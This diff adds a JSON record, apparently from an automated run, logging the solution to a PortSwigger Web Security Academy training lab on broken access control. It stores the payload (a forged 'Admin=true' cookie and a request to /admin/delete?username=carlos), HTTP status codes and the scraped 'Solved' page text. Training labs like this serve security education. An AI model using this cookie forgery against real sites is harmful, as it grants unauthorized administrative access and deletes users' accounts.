@@ -1,0 +1,28 @@
+{
+  "labIndex": 19,
+  "category": "Broken Access Control",
+  "officialUrl": "https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter",
+  "technique": "Login como wiener e cookie Admin=true para acessar /admin e excluir carlos",
+  "payload": "Cookie: Admin=true; GET /admin/delete?username=carlos",
+  "launch": {
+    "officialUrl": "https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter",
+    "url": "https://0a19006104ab82a580bb85e600e4003f.web-security-academy.net/",
+    "base": "https://0a19006104ab82a580bb85e600e4003f.web-security-academy.net",
+    "title": "User role controlled by request parameter",
+    "attempt": 1
+  },
+  "http": {
+    "loginStatus": 302,
+    "adminStatus": 200,
+    "deleteStatus": 302
+  },
+  "instanceBase": "https://0a19006104ab82a580bb85e600e4003f.web-security-academy.net",
+  "bannerText": "User role controlled by request parameter\nBack to lab description  \nLAB\n\nSolved",
+  "solved": true,
+  "statusClass": "widgetcontainer-lab-status is-solved",
+  "statusText": "LAB\n\nSolved",
+  "text": "User role controlled by request parameter\nBack to lab description  \nLAB\n\nSolved\n\nCongratulations, you solved the lab!\nShare your skills! \n \n Continue learning\nHome\n\n|\n\nMy account\nBeat the Vacation Traffic\n $91.55\nView details\nYour Virtual Journey Starts Here\n $83.14\nView details\nWTF? - The adult party game\n $8.18\nView details\nHologram Stand In\n $34.47\nView details\nWaterproof Tea Bags\n $64.98\nView details\nRobot Home Security Buddy\n $35.77\nView details\nBURP Protection\n $91.93\nView details\nHexbug Battleground Tarantula Double Pack\n $59.11\nView details\nDancing In The Dark\n $64.64\nView details\nEggtastic, Fun, Food Eggcessories\n $37.01\nView details\nPhotobomb Backdrops\n $33.80\nView details\nBalance Beams\n $93.97\nView details\nLaser Tag\n $42.29\nView details\nThe Alternative Christmas Tree\n $39.85\nView details\nSingle Use Food Hider\n $49.85\nView details\nAll-in-One Typewriter\n $17.61\nView details\nHitch A Lift\n $46.67\nView details\nThe Bucket of Doom\n $54.13\nView details\nPaddling Pool Shoes\n $51.41\nView details\nHydrated Crackers\n $52.27\nView details",
+  "title": "User role controlled by request parameter",
+  "url": "https://0a19006104ab82a580bb85e600e4003f.web-security-academy.net/",
+  "evidenceScreenshot": "../screenshots/19-user-role-controlled-by-request-parameter-solved.png"
+}
